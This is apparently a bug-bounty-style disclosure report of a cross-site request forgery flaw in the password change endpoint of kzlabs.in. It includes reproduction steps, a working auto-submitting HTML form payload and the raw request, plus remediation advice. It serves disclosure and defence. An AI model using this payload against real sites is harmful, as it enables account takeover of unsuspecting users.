Password Change via Missing Anti-CSRF Protection

## Vulnerability Type: Cross-Site Request Forgery (CSRF)
## Summary
The password change functionality is vulnerable to Cross-Site Request Forgery (CSRF).
An authenticated user can be tricked into visiting a malicious webpage that automatically submits a forged password change request on their behalf. Since the application does not validate a CSRF token and accepts the request solely based on the victim's authenticated session, an attacker can change the victim's account password without their knowledge or consent.

## Affected Endpoint
POST /1307.php?action=settings

Parameters
```
new_password
confirm_password
```

## Steps to Reproduce
1. Log in to the application.
2. Navigate to:`http://kzlabs.in/1307.php?action=settings`
3. Change the password and intercept the request.
4. Observe that the request contains no anti-CSRF token.
5. Create the following malicious HTML page:
```html
<html>
<body>
<form action="https://kzlabs.in/1307.php?action=settings" method="POST">
<input type="hidden" name="new_password" value="newpassword">
<input type="hidden" name="confirm_password" value="newpassword">
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
6. Host the file on any attacker-controlled website.
7. While logged into the vulnerable application, visit the malicious page.
8. The password is changed automatically without any user interaction.

## Proof of Concept
### Request
```http
POST /1307.php?action=settings HTTP/1.1
Host: kzlabs.in
Content-Type: application/x-www-form-urlencoded
new_password=newpassword&
confirm_password=newpassword
```
## Observations
- No CSRF token is present.
- No token validation is performed server-side.
- Request succeeds using only the victim's session cookie.
- Password is changed immediately after the forged request is submitted.

## Evidence
### Screenshot 1
Password change request intercepted in Burp Suite showing no CSRF token.
<img width="1919" height="1007" alt="Screenshot 2026-06-06 124520" src="https://github.com/user-attachments/assets/a41023f2-57ed-42de-a6f8-d8e5eba9a6fe" />

### Screenshot 2
Burp Suite generating a CSRF Proof of Concept.
<img width="1918" height="964" alt="Screenshot 2026-06-06 124529" src="https://github.com/user-attachments/assets/f98ce439-9627-4074-85b2-36dfb1dfe469" />

### Screenshot 3
Generated malicious HTML page.

<img width="1919" height="1018" alt="Screenshot 2026-06-06 124623" src="https://github.com/user-attachments/assets/888982fa-86a3-4ff2-818a-97d1702ada2c" />

### Screenshot 4
Victim opens the malicious page while authenticated.

<img width="1050" height="289" alt="Screenshot 2026-06-06 124653" src="https://github.com/user-attachments/assets/cfcc7b0c-e72f-4172-b160-2d036267175b" />

### Screenshot 5
Password is successfully changed to the attacker-controlled value.

<img width="1919" height="980" alt="Screenshot 2026-06-06 124747" src="https://github.com/user-attachments/assets/41cd009b-64f0-4137-8779-455367c2b00a" />

## Impact
An Attacker can:
- Change a victim's account password.
- Lock legitimate users out of their accounts.
- Gain full access to the victim's account after setting a known password.
- Attacker can compromise all actions available to the victim's account.
Because password modification is a highly sensitive action, successful exploitation can result in complete account takeover.

## Remediation
1. Add CSRF protection to the password change functionality to ensure the authenticated user genuinely initiates requests.
2. Validate all password change requests on the server before processing them.
3. Verify that requests originate from trusted application pages by checking the Origin or Referer headers.
4. Require the user to enter their current password before allowing a password update.

